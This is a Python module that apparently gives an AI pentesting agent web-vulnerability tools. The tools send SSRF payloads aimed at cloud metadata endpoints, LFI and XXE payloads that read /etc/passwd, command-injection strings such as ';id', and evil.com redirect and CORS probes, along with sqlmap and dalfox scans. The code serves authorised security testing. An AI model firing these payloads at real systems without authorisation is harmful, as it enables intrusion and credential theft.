import asyncio
import base64
import hashlib
import hmac
import json
import os
import re
import shutil
import tempfile
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

from mcp.types import Tool

from .register_all import register
from ._helpers import _run_subprocess, _save_artifact, _record_execution


async def _persist(project_id, tool_name: str, args: dict, stdout: str, stderr: str, exit_code: int):
    if project_id:
        out_p, err_p, sha = await _save_artifact(int(project_id), tool_name, stdout, stderr)
        await _record_execution(int(project_id), tool_name, args, out_p, err_p, exit_code, sha)


def _build_url_with_param(target: str, param: str, value: str) -> str:
    """
    Append `param=value` (properly URL-encoded) to `target`, preserving any
    existing query string and fragment. Fixes [B] from the audit: the old
    pattern f"{target}?{param}={value}" produced URLs like
    "http://x/api?a=1?param=…" when target already had a query, and never
    encoded the payload.
    """
    parts = urllib.parse.urlsplit(target)
    existing = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    existing.append((param, value))
    new_query = urllib.parse.urlencode(existing, doseq=True, quote_via=urllib.parse.quote)
    return urllib.parse.urlunsplit((parts.scheme, parts.netloc, parts.path, new_query, parts.fragment))


def _jwt_alg(token: str) -> str | None:
    """Return the `alg` field from a JWT header, lowercased; None on malformed."""
    try:
        head_b64 = token.split(".", 1)[0]
        pad = "=" * (-len(head_b64) % 4)
        head = json.loads(base64.urlsafe_b64decode(head_b64 + pad))
        alg = head.get("alg")
        return alg.lower() if isinstance(alg, str) else None
    except Exception:
        return None


def _imds_signal(body: str) -> str | None:
    """Detect cloud-metadata-shaped content in an HTTP body. Returns a short
    label naming the provider, or None. Used by SSRF probes to flag real wins
    instead of relying on response size alone."""
    if not body:
        return None
    snippet = body[:8192]  # cap for speed
    if any(k in snippet for k in ("ami-id", "instance-id", "instance-type", "iam/security-credentials", "placement/availability-zone")):
        return "AWS IMDS"
    if "computeMetadata/v1" in snippet or '"hostname":' in snippet and "googleusercontent" in snippet:
        return "GCP metadata"
    if any(k in snippet for k in ("/metadata/instance", '"compute":', '"network":') ) and "azure" in snippet.lower():
        return "Azure IMDS"
    if "DigitalOcean" in snippet or "droplet_id" in snippet:
        return "DigitalOcean metadata"
    if "root:x:" in snippet or "daemon:x:" in snippet or "nobody:x:" in snippet:
        return "/etc/passwd disclosed"
    if "[boot loader]" in snippet or "[operating systems]" in snippet:
        return "Windows boot.ini disclosed"
    return None


# ---------------------------------------------------------------------------
# http_probe  (curl -L with headers → status/title/server)
# ---------------------------------------------------------------------------

async def _http_probe(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 30))
    cmd = [
        "curl", "-sL", "-m", "15",
        "-D", "-",
        "--user-agent", "Mozilla/5.0 (X11; Linux x86_64) pentesting-agent/1.0",
        target,
    ]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "http_probe", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    lines = []
    status_m = re.search(r"HTTP/[\d.]+ (\d+ .+)", stdout)
    if status_m:
        lines.append(f"Status: {status_m.group(1)}")
    server_m = re.search(r"(?i)^server:\s*(.+)", stdout, re.MULTILINE)
    if server_m:
        lines.append(f"Server: {server_m.group(1).strip()}")
    title_m = re.search(r"<title[^>]*>([^<]{1,200})</title>", stdout, re.IGNORECASE)
    if title_m:
        lines.append(f"Title: {title_m.group(1).strip()}")
    ct_m = re.search(r"(?i)^content-type:\s*(.+)", stdout, re.MULTILINE)
    if ct_m:
        lines.append(f"Content-Type: {ct_m.group(1).strip()}")
    lines.append(f"\n--- raw response (truncated) ---\n{stdout[:3000]}")
    return "\n".join(lines)


register(
    Tool(
        name="http_probe",
        description="HTTP probe using curl: returns status code, server header, page title, and content-type.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 30)"},
            },
        },
    ),
    _http_probe,
)


# ---------------------------------------------------------------------------
# tech_detect  (whatweb)
# ---------------------------------------------------------------------------

async def _tech_detect(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    if not shutil.which("whatweb"):
        return "Error: whatweb not found in PATH. Install: apt install whatweb"
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 60))
    cmd = ["whatweb", "--log-brief=-", target]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "tech_detect", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    return stdout or stderr or f"No technology data for {target}."


register(
    Tool(
        name="tech_detect",
        description="Identify web technologies using whatweb.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 60)"},
            },
        },
    ),
    _tech_detect,
)


# ---------------------------------------------------------------------------
# ssl_check  (sslscan)
# ---------------------------------------------------------------------------

async def _ssl_check(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required (host or host:port)."
    if not shutil.which("sslscan"):
        return "Error: sslscan not found in PATH. Install: apt install sslscan"
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 60))
    cmd = ["sslscan", "--no-colour", target]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "ssl_check", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    return stdout or stderr or f"No SSL data for {target}."


register(
    Tool(
        name="ssl_check",
        description="SSL/TLS analysis using sslscan: protocols, ciphers, certificate details.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Host or host:port, e.g. 'example.com:443'"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 60)"},
            },
        },
    ),
    _ssl_check,
)


# ---------------------------------------------------------------------------
# security_headers  (curl HEAD → parse security headers)
# ---------------------------------------------------------------------------

async def _security_headers(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 30))
    cmd = ["curl", "-sI", "-m", "15", target]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "security_headers", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    security_hdrs = [
        "Strict-Transport-Security",
        "Content-Security-Policy",
        "X-Frame-Options",
        "X-Content-Type-Options",
        "X-XSS-Protection",
        "Referrer-Policy",
        "Permissions-Policy",
        "Cross-Origin-Opener-Policy",
        "Cross-Origin-Resource-Policy",
    ]
    findings = []
    present = []
    for hdr in security_hdrs:
        m = re.search(rf"(?i)^{re.escape(hdr)}:\s*(.+)", stdout, re.MULTILINE)
        if m:
            present.append(f"  [PRESENT] {hdr}: {m.group(1).strip()}")
        else:
            findings.append(f"  [MISSING] {hdr}")
    lines = [f"Security headers for {target}:"]
    lines += present
    lines += findings
    return "\n".join(lines)


register(
    Tool(
        name="security_headers",
        description="Check HTTP security headers (HSTS, CSP, X-Frame-Options, etc.) via curl.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 30)"},
            },
        },
    ),
    _security_headers,
)


# ---------------------------------------------------------------------------
# cors_check  (test CORS with Origin header)
# ---------------------------------------------------------------------------

async def _cors_check(args: dict) -> str:
    target = (args.get("target") or "").strip()
    origin = (args.get("origin") or "https://evil.com").strip()
    if not target:
        return "Error: target is required."
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 30))
    cmd = ["curl", "-sI", "-m", "15", "-H", f"Origin: {origin}", target]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "cors_check", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    acao = re.search(r"(?i)^Access-Control-Allow-Origin:\s*(.+)", stdout, re.MULTILINE)
    acac = re.search(r"(?i)^Access-Control-Allow-Credentials:\s*(.+)", stdout, re.MULTILINE)
    lines = [f"CORS check for {target} (Origin: {origin}):"]
    if acao:
        val = acao.group(1).strip()
        lines.append(f"  Access-Control-Allow-Origin: {val}")
        if val == origin or val == "*":
            lines.append("  [POTENTIAL ISSUE] Origin reflected or wildcard")
    else:
        lines.append("  Access-Control-Allow-Origin: NOT SET")
    if acac:
        lines.append(f"  Access-Control-Allow-Credentials: {acac.group(1).strip()}")
    return "\n".join(lines)


register(
    Tool(
        name="cors_check",
        description="Test CORS configuration by sending a crafted Origin header and checking the response.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "origin": {"type": "string", "description": "Origin to inject (default: https://evil.com)"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 30)"},
            },
        },
    ),
    _cors_check,
)


# ---------------------------------------------------------------------------
# open_redirect_check
# ---------------------------------------------------------------------------

async def _open_redirect_check(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    payloads = [
        "https://evil.com",
        "//evil.com",
        "/\\evil.com",
        "https://evil.com%2F",
        "https:///evil.com",
    ]
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 60))
    params = (args.get("params") or "url,redirect,next,return,returnUrl,goto,dest,destination,redir,target,link").split(",")
    results = []
    for param in params[:5]:
        for payload in payloads[:3]:
            test_url = f"{target}?{param.strip()}={payload}"
            cmd = ["curl", "-sI", "-m", "10", "--max-redirs", "0", test_url]
            stdout, stderr, rc = await _run_subprocess(cmd, timeout=timeout_s)
            loc = re.search(r"(?i)^[Ll]ocation:\s*(.+)", stdout, re.MULTILINE)
            if loc and "evil.com" in loc.group(1):
                results.append(f"  [VULN] param={param} payload={payload} → {loc.group(1).strip()}")
    await _persist(project_id, "open_redirect_check", args, "\n".join(results), "", 0)
    if not results:
        return f"No open redirects found on {target} (tested {len(params[:5])} params)."
    return f"Open redirect findings for {target}:\n" + "\n".join(results)


register(
    Tool(
        name="open_redirect_check",
        description="Test common redirect parameters for open redirect vulnerabilities.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL (without params)"},
                "params": {"type": "string", "description": "Comma-separated param names to test (default: common redirect params)"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 60)"},
            },
        },
    ),
    _open_redirect_check,
)


# ---------------------------------------------------------------------------
# xss_reflect  (dalfox URL scan)
# ---------------------------------------------------------------------------

async def _xss_reflect(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    if not shutil.which("dalfox"):
        return "Error: dalfox not found in PATH."
    cookies = (args.get("cookies") or "").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 120))
    cmd = ["dalfox", "url", target, "--silence", "--format", "json"]
    if cookies:
        cmd += ["--cookie", cookies]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "xss_reflect", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    try:
        data = json.loads(stdout) if stdout.strip() else []
        if isinstance(data, dict):
            data = [data]
        if not data:
            return f"dalfox: no reflected XSS found on {target}"
        lines = [f"Reflected XSS findings ({len(data)}):"]
        for item in data:
            lines.append(f"  param={item.get('param','?')} type={item.get('type','?')}")
            lines.append(f"    payload: {item.get('poc','')[:120]}")
        return "\n".join(lines)
    except json.JSONDecodeError:
        return f"dalfox output:\n{stdout[:2000]}"


register(
    Tool(
        name="xss_reflect",
        description="Reflected XSS scan using dalfox url mode.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL with parameters"},
                "cookies": {"type": "string", "description": "Cookie header for authenticated scans"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 120)"},
            },
        },
    ),
    _xss_reflect,
)


# ---------------------------------------------------------------------------
# xss_dom  (dalfox DOM scan)
# ---------------------------------------------------------------------------

async def _xss_dom(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    if not shutil.which("dalfox"):
        return "Error: dalfox not found in PATH."
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 120))
    cmd = ["dalfox", "url", target, "--silence", "--format", "json", "--only-poc", "da"]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "xss_dom", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    return stdout or f"dalfox DOM scan complete. No DOM XSS found on {target}."


register(
    Tool(
        name="xss_dom",
        description="DOM-based XSS scan using dalfox with DOM analysis mode.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 120)"},
            },
        },
    ),
    _xss_dom,
)


# ---------------------------------------------------------------------------
# sqli_error  (sqlmap --level=1 --risk=1 error-based)
# ---------------------------------------------------------------------------

async def _sqli_error(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    if not shutil.which("sqlmap"):
        return "Error: sqlmap not found in PATH."
    data = (args.get("data") or "").strip()
    cookies = (args.get("cookies") or "").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 180))
    cmd = [
        "sqlmap", "-u", target, "--batch", "--level", "1", "--risk", "1",
        "--technique", "E", "--output-dir",
        str(Path.home() / ".local" / "share" / "penligent-local" / "sqlmap"),
    ]
    if data:
        cmd += ["--data", data]
    if cookies:
        cmd += ["--cookie", cookies]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "sqli_error", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    verdict = [ln for ln in stdout.splitlines() if any(k in ln for k in ["injectable", "Parameter:", "sqlmap identified", "[WARNING]"])]
    return f"sqlmap error-based SQLi:\n" + ("\n".join(verdict) if verdict else stdout[-2000:])


register(
    Tool(
        name="sqli_error",
        description="sqlmap error-based SQL injection (level=1, risk=1, technique=E).",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL with parameter"},
                "data": {"type": "string", "description": "POST body"},
                "cookies": {"type": "string", "description": "Cookie header"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 180)"},
            },
        },
    ),
    _sqli_error,
)


# ---------------------------------------------------------------------------
# sqli_blind  (sqlmap --level=3 --risk=2)
# ---------------------------------------------------------------------------

async def _sqli_blind(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    if not shutil.which("sqlmap"):
        return "Error: sqlmap not found in PATH."
    data = (args.get("data") or "").strip()
    cookies = (args.get("cookies") or "").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 300))
    cmd = [
        "sqlmap", "-u", target, "--batch", "--level", "3", "--risk", "2",
        "--technique", "BT", "--output-dir",
        str(Path.home() / ".local" / "share" / "penligent-local" / "sqlmap"),
    ]
    if data:
        cmd += ["--data", data]
    if cookies:
        cmd += ["--cookie", cookies]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "sqli_blind", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    verdict = [ln for ln in stdout.splitlines() if any(k in ln for k in ["injectable", "Parameter:", "sqlmap identified", "[WARNING]"])]
    return "sqlmap blind SQLi:\n" + ("\n".join(verdict) if verdict else stdout[-2000:])


register(
    Tool(
        name="sqli_blind",
        description="sqlmap blind SQL injection (level=3, risk=2, technique=BT boolean/time-based).",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL with parameter"},
                "data": {"type": "string", "description": "POST body"},
                "cookies": {"type": "string", "description": "Cookie header"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 300)"},
            },
        },
    ),
    _sqli_blind,
)


# ---------------------------------------------------------------------------
# sqli_union  (sqlmap --technique=U)
# ---------------------------------------------------------------------------

async def _sqli_union(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    if not shutil.which("sqlmap"):
        return "Error: sqlmap not found in PATH."
    data = (args.get("data") or "").strip()
    cookies = (args.get("cookies") or "").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 180))
    cmd = [
        "sqlmap", "-u", target, "--batch", "--technique", "U",
        "--output-dir",
        str(Path.home() / ".local" / "share" / "penligent-local" / "sqlmap"),
    ]
    if data:
        cmd += ["--data", data]
    if cookies:
        cmd += ["--cookie", cookies]
    stdout, stderr, exit_code = await _run_subprocess(cmd, timeout=timeout_s)
    await _persist(project_id, "sqli_union", args, stdout, stderr, exit_code)
    if exit_code == -1:
        return stderr
    verdict = [ln for ln in stdout.splitlines() if any(k in ln for k in ["injectable", "Parameter:", "sqlmap identified", "[WARNING]"])]
    return "sqlmap UNION-based SQLi:\n" + ("\n".join(verdict) if verdict else stdout[-2000:])


register(
    Tool(
        name="sqli_union",
        description="sqlmap UNION-based SQL injection (technique=U).",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL with parameter"},
                "data": {"type": "string", "description": "POST body"},
                "cookies": {"type": "string", "description": "Cookie header"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 180)"},
            },
        },
    ),
    _sqli_union,
)


# ---------------------------------------------------------------------------
# ssrf_probe  (curl with SSRF payloads)
# ---------------------------------------------------------------------------

async def _ssrf_probe(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    param = (args.get("param") or "url").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 60))
    payloads = [
        "http://127.0.0.1/",
        "http://localhost/",
        # Cloud metadata services — strong positive signal when reached:
        "http://169.254.169.254/latest/meta-data/",            # AWS IMDSv1
        "http://metadata.google.internal/computeMetadata/v1/", # GCP
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
        "http://[::1]/",
        "http://0.0.0.0/",
        "http://2130706433/",                                  # 127.0.0.1 as int
        "file:///etc/passwd",                                  # parser may follow file://
    ]
    results = []
    hits = []
    sizes = []
    for payload in payloads:
        # [B] Use the URL builder — handles existing `?` and URL-encodes the value.
        test_url = _build_url_with_param(target, param, payload)
        cmd = ["curl", "-sL", "-m", "8", "-w", "\\n%{http_code}", test_url]
        stdout, stderr, rc = await _run_subprocess(cmd, timeout=timeout_s)
        code_m = re.search(r"\n(\d{3})$", stdout)
        code = code_m.group(1) if code_m else "?"
        body = stdout[: -4] if code_m else stdout  # strip trailing \n<code>
        body_len = len(body)
        sizes.append(body_len)
        # [C] Positive signals: cloud-metadata shapes, /etc/passwd lines, etc.
        signal = _imds_signal(body)
        if signal:
            hits.append((payload, signal))
            results.append(f"  [VULN] {payload} → HTTP {code} — {signal} (body_len={body_len})")
        else:
            results.append(f"  {payload} → HTTP {code} body_len={body_len}")
    # Additional heuristic: if some payloads succeed with very different sizes,
    # something distinguishes them — likely SSRF reachability differential.
    if not hits and sizes and max(sizes) - min(sizes) > 200:
        results.append(f"  [HEURISTIC] body size differential across payloads ({min(sizes)}–{max(sizes)} bytes) — review manually.")
    summary = (
        f"SSRF probe for {target} (param={param}):\n"
        + ("[CONFIRMED] " + ", ".join(f"{p}={s}" for p, s in hits) + "\n" if hits else "")
        + "\n".join(results)
    )
    await _persist(project_id, "ssrf_probe", args, summary, "", 0)
    return summary


register(
    Tool(
        name="ssrf_probe",
        description="Test URL parameters for SSRF by injecting localhost/metadata payloads.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL base"},
                "param": {"type": "string", "description": "Parameter name to inject (default: url)"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 60)"},
            },
        },
    ),
    _ssrf_probe,
)


# ---------------------------------------------------------------------------
# ssti_probe  ({{7*7}} and other SSTI payloads)
# ---------------------------------------------------------------------------

async def _ssti_probe(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    param = (args.get("param") or "").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 60))
    payloads = [
        ("{{7*7}}", "49"),
        ("${7*7}", "49"),
        ("<%= 7*7 %>", "49"),
        ("#{7*7}", "49"),
        ("*{7*7}", "49"),
        ("{{7*'7'}}", "7777777"),
    ]
    base_url = target if not param else target
    results = []
    for payload, expected in payloads:
        encoded = urllib.parse.quote(payload)
        if param:
            test_url = f"{target}?{param}={encoded}"
        else:
            test_url = f"{target}{encoded}"
        cmd = ["curl", "-sL", "-m", "10", test_url]
        stdout, stderr, rc = await _run_subprocess(cmd, timeout=timeout_s)
        if expected in stdout:
            results.append(f"  [VULN] payload={payload!r} → response contains '{expected}' (SSTI confirmed)")
        else:
            results.append(f"  [SAFE] payload={payload!r} → '{expected}' not in response")
    summary = f"SSTI probe for {target}:\n" + "\n".join(results)
    await _persist(project_id, "ssti_probe", args, summary, "", 0)
    return summary


register(
    Tool(
        name="ssti_probe",
        description="Test for Server-Side Template Injection by injecting arithmetic payloads ({{7*7}} etc.).",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "param": {"type": "string", "description": "GET parameter name to inject payload into"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 60)"},
            },
        },
    ),
    _ssti_probe,
)


# ---------------------------------------------------------------------------
# lfi_probe  (path traversal/LFI patterns)
# ---------------------------------------------------------------------------

async def _lfi_probe(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    param = (args.get("param") or "file").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 90))
    payloads = [
        "../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "/etc/passwd",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
    ]
    results = []
    for payload in payloads:
        test_url = f"{target}?{param}={urllib.parse.quote(payload)}"
        cmd = ["curl", "-sL", "-m", "10", test_url]
        stdout, stderr, rc = await _run_subprocess(cmd, timeout=timeout_s)
        if "root:" in stdout or "daemon:" in stdout:
            results.append(f"  [VULN] {payload!r} → /etc/passwd content in response!")
        elif len(stdout) > 100:
            results.append(f"  [CHECK] {payload!r} → response len={len(stdout)} (manual review)")
    if not results:
        results.append(f"  No obvious LFI detected for param={param}")
    summary = f"LFI probe for {target}:\n" + "\n".join(results)
    await _persist(project_id, "lfi_probe", args, summary, "", 0)
    return summary


register(
    Tool(
        name="lfi_probe",
        description="Test for Local File Inclusion / path traversal using common payloads.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL (without param)"},
                "param": {"type": "string", "description": "Parameter name (default: file)"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 90)"},
            },
        },
    ),
    _lfi_probe,
)


# ---------------------------------------------------------------------------
# rfi_probe  (Remote File Inclusion patterns)
# ---------------------------------------------------------------------------

async def _rfi_probe(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    param = (args.get("param") or "file").strip()
    callback_host = (args.get("callback_host") or "").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 60))
    payloads = [
        "http://127.0.0.1/",
        "https://example.com/",
    ]
    if callback_host:
        payloads.insert(0, f"http://{callback_host}/rfi_test.php")
    results = []
    for payload in payloads:
        test_url = _build_url_with_param(target, param, payload)
        cmd = ["curl", "-sL", "-m", "10", "-w", "\\nHTTP_CODE:%{http_code}", test_url]
        stdout, stderr, rc = await _run_subprocess(cmd, timeout=timeout_s)
        results.append(f"  payload={payload!r} → rc={rc} response_len={len(stdout)}")
    summary = f"RFI probe for {target} (param={param}):\n" + "\n".join(results)
    await _persist(project_id, "rfi_probe", args, summary, "", 0)
    return summary


register(
    Tool(
        name="rfi_probe",
        description="Test for Remote File Inclusion by injecting external URLs into file parameters.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "param": {"type": "string", "description": "Parameter name (default: file)"},
                "callback_host": {"type": "string", "description": "Your OOB callback host for RFI detection"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 60)"},
            },
        },
    ),
    _rfi_probe,
)


# ---------------------------------------------------------------------------
# xxe_probe  (XXE via curl POST)
# ---------------------------------------------------------------------------

async def _xxe_probe(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    callback_host = (args.get("callback_host") or "").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 30))
    # [D] Broadened payload set. The "blind_oob" payload now uses
    # callback_host when supplied; without it we drop the useless 127.0.0.1
    # version and substitute one that targets a Windows path instead so we
    # cover both Linux and Windows file-disclosure shapes.
    xxe_payloads = [
        ("classic_etc_passwd",
         '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'),
        ("php_filter_b64",
         '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><root>&xxe;</root>'),
        ("windows_hosts",
         '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><root>&xxe;</root>'),
    ]
    if callback_host:
        xxe_payloads.append((
            "blind_oob",
            f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{callback_host}/xxe-test">%xxe;]><root/>'
        ))
    results = []
    confirmed = 0
    for name, payload in xxe_payloads:
        cmd = [
            "curl", "-sL", "-m", "10", "-X", "POST",
            "-H", "Content-Type: application/xml",
            "-d", payload, target,
        ]
        stdout, stderr, rc = await _run_subprocess(cmd, timeout=timeout_s)
        signal = _imds_signal(stdout)  # also catches /etc/passwd disclosure shapes
        # Additional XXE-specific signals beyond file content:
        lower = stdout.lower()
        parser_err = any(k in lower for k in (
            "doctype", "entity", "external", "saxparser", "xmlreader",
            "expat", "lxml.etree", "xml.parsers", "xerces"))
        if signal:
            results.append(f"  [VULN] {name} → {signal}")
            confirmed += 1
        elif "PD9waHA" in stdout or "PD94bWw" in stdout:
            # base64 of "<?php" or "<?xml" — php_filter payload exfilled source
            results.append(f"  [VULN] {name} → base64-encoded source disclosed via php://filter")
            confirmed += 1
        elif parser_err:
            results.append(f"  [SUSPECTED] {name} → XML parser error / DTD mention in response (parser sees DTD; restrictions may still block content)")
        else:
            results.append(f"  [?] {name} → response len={len(stdout)} rc={rc}")
    if not callback_host and confirmed == 0:
        results.append("  [HINT] Pass callback_host=<your-collab-host> to test blind XXE via OOB.")
    summary = f"XXE probe for {target}:\n" + "\n".join(results)
    await _persist(project_id, "xxe_probe", args, summary, "", 0)
    return summary


register(
    Tool(
        name="xxe_probe",
        description="Test for XML External Entity injection by POSTing XXE payloads. Includes /etc/passwd, Windows hosts, php://filter source disclosure, and optional blind-OOB via callback_host.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL accepting XML POST"},
                "callback_host": {"type": "string", "description": "Your OOB callback host (e.g. interactsh subdomain) — enables blind XXE detection"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 30)"},
            },
        },
    ),
    _xxe_probe,
)


# ---------------------------------------------------------------------------
# cmdi_probe  (command injection patterns)
# ---------------------------------------------------------------------------

async def _cmdi_probe(args: dict) -> str:
    target = (args.get("target") or "").strip()
    if not target:
        return "Error: target is required."
    param = (args.get("param") or "").strip()
    project_id = args.get("project_id")
    timeout_s = int(args.get("timeout", 60))
    payloads = [
        ";id",
        "|id",
        "`id`",
        "$(id)",
        ";sleep 5",
        "&&id",
        "||id",
    ]
    results = []
    for payload in payloads:
        if param:
            test_url = f"{target}?{param}={urllib.parse.quote(payload)}"
        else:
            test_url = f"{target}{urllib.parse.quote(payload)}"
        start = time.time()
        cmd = ["curl", "-sL", "-m", "12", test_url]
        stdout, stderr, rc = await _run_subprocess(cmd, timeout=timeout_s)
        elapsed = time.time() - start
        if "uid=" in stdout and "gid=" in stdout:
            results.append(f"  [VULN] {payload!r} → id command output in response!")
        elif elapsed > 4.5 and "sleep" in payload:
            results.append(f"  [VULN] {payload!r} → time delay {elapsed:.1f}s (blind cmdi)")
        else:
            results.append(f"  [OK] {payload!r} → no indicator (elapsed={elapsed:.1f}s)")
    summary = f"CMDi probe for {target}:\n" + "\n".join(results)
    await _persist(project_id, "cmdi_probe", args, summary, "", 0)
    return summary


register(
    Tool(
        name="cmdi_probe",
        description="Test for OS command injection using common shell metacharacter payloads.",
        inputSchema={
            "type": "object",
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "description": "Target URL"},
                "param": {"type": "string", "description": "GET parameter name to inject"},
                "project_id": {"type": "integer"},
                "timeout": {"type": "integer", "description": "Timeout seconds (default 60)"},
            },
        },
    ),
    _cmdi_probe,
)


# ---------------------------------------------------------------------------
